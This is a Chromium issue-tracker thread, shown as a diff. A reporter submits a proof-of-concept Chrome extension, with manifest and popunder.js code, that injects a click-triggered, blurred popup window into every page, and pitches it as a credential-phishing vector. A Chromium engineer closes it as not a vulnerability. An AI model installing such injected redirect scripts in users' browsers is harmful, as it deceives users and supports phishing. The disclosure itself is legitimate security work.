@@ -1,0 +1,43 @@
+Issue ID: 350627108
+
+Author: tu...@gmail.com
+<a href="https://chromewebstore.google.com/unsupported" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chromewebstore.google.com/unsupported" data-b-redirected-href="https://chromewebstore.google.com/unsupported">https://chromewebstore.google.com/unsupported</a><br><br>Chrome is not blocking &quot;Popunder Scripts&quot; execute in Chrome on it’s chrome extension.<br><br>Lead to phishing on behalf of anysite.tld<br><br># How an Attacker  can exploit this Code scanning misconfiguration bug?<br><br>Attacker first publish an extension in Chrome.<br><br>After user downloading it, Attacker will be update it with Popunder script. After update, <br><br>When user visit anysite.tld, On interaction with anysite.tld, A popup window will be open, that&#39;s redirect user to anysite-fake.tld<br><br>Strong approach to credentials stealing of user by fool user, that the link is open from <a href="https://www.google.com/url?q=https://legitimate.tld&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3CcppfehYjsFNitf9b-RzC" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://legitimate.tld" data-b-redirected-href="https://www.google.com/url?q=https://legitimate.tld&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3CcppfehYjsFNitf9b-RzC">https://legitimate.tld</a><br><br><br># Steps to Reproduce<br><br>To create a Chrome extension that injects a popunder script triggered by user interaction into every page a user visits, you&#39;ll need to create a few files: manifest.json, the content script (popunder.js), and optionally a background script if needed. Below are the steps and the necessary code:<br>1. manifest.json<br>{<br>  &quot;manifest_version&quot;: 3,<br>  &quot;name&quot;: &quot;Popunder Extension&quot;,<br>  &quot;version&quot;: &quot;1.0&quot;,<br>  &quot;permissions&quot;: [<br>    &quot;activeTab&quot;,<br>    &quot;scripting&quot;<br>  ],<br>  &quot;content_scripts&quot;: [<br>    {<br>      &quot;matches&quot;: [&quot;&lt;all_urls&gt;&quot;],<br>      &quot;js&quot;: [&quot;popunder.js&quot;]<br>    }<br>  ],<br>  &quot;background&quot;: {<br>    &quot;service_worker&quot;: &quot;background.js&quot;<br>  }<br>}<br><br>2. popunder.js<br>This is the content script that will be injected into every page.<br><br>(function() {<br>    function openPopunder(url) {<br>        var newWindow = window.open(url, &#39;_blank&#39;, &#39;toolbar=no,scrollbars=no,resizable=no,status=no,location=no,menu=no,width=800,height=600&#39;);<br>        if (newWindow) {<br>            newWindow.blur();<br>            window.focus();<br>        }<br>    }<br><br>    document.addEventListener(&#39;click&#39;, function(event) {<br>        // Make sure the popunder only opens once<br>        if (!event.isTrusted || window.popunderOpened) return;<br>        window.popunderOpened = true;<br><br>        openPopunder(&#39;<a href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a>&#39;);<br>    });<br>})();<br><br>3. Optional background.js<br>This file is optional and can be used to handle background tasks or listen for events. For this example, it&#39;s not strictly necessary, but here&#39;s a simple version:<br><br>This file is optional and can be used to handle background tasks or listen for events. For this example, it&#39;s not strictly necessary, but here&#39;s a simple version:<br><br>chrome.runtime.onInstalled.addListener(function() {<br>  console.log(&quot;Popunder Extension installed.&quot;);<br>});<br><br>Steps to Build and Install the Extension:<br>Create Directory: Create a new directory for your extension (e.g., popunder-extension).<br>Add Files: Inside this directory, create the manifest.json, popunder.js, and optionally background.js files with the contents provided above<br><br>Load the Extension:<br>Open Chrome and go to chrome://extensions/.<br>Enable &quot;Developer mode&quot; by clicking the toggle switch.<br>Click &quot;Load unpacked&quot; and select the directory where you created the files.<br><br><br>Now, visit a website. Click on the website, A redirect popup window will be Open.<br><br>***PoC***<br><a href="https://drive.google.com/file/d/1VErmcGTkLx-WRP3vQlpmy3Let6aWvf4w/view?usp=drivesdk" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://drive.google.com/file/d/1VErmcGTkLx-WRP3vQlpmy3Let6aWvf4w/view?usp=drivesdk" data-b-redirected-href="https://drive.google.com/file/d/1VErmcGTkLx-WRP3vQlpmy3Let6aWvf4w/view?usp=drivesdk">https://drive.google.com/file/d/1VErmcGTkLx-WRP3vQlpmy3Let6aWvf4w/view?usp=drivesdk</a><br><br>***Fix***<br>Block PopUnder script in extension. <br><br><br>***Impact****<br><br>Strong approach to stealing sensitive credentials or information of public.
+
+Author: tu...@gmail.com
+public_non_google
+
+Author: tu...@gmail.com
+By Popunder Scripts, After updating Attacker extension, lead user attacker-site.tld from anysite.tld, If user click on anysite.tld, when Attacker chrome extension is active.
+
+Author: tu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: tu...@gmail.com
+Now, Tested with latest version of Chrome. It&#39;s works.<br>Video: <a href="https://drive.google.com/file/d/1flt5pNVnqgiqByAu7CcujX0fCSTlyrlV/view?usp=sharing" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://drive.google.com/file/d/1flt5pNVnqgiqByAu7CcujX0fCSTlyrlV/view?usp=sharing" data-b-redirected-href="https://drive.google.com/file/d/1flt5pNVnqgiqByAu7CcujX0fCSTlyrlV/view?usp=sharing">https://drive.google.com/file/d/1flt5pNVnqgiqByAu7CcujX0fCSTlyrlV/view?usp=sharing</a>
+
+Author: da...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: da...@chromium.org
+public_non_google
+
+Author: da...@chromium.org
+<p>IIUC this is an extension that opens a popup window and calls blur on it. This is valid use if javascript APIs that are part of the web platform, and extensions should be able to do this. The popup window has a titlebar and omnibox, and the omnibox shows the real URL, not a spoofed one. So I don&#39;t believe there is a security issue here. This is similar to that websites can redirect to other websites, and it&#39;s the job of the omnibox to display what website is being viewed.</p>
+
+Author: pe...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
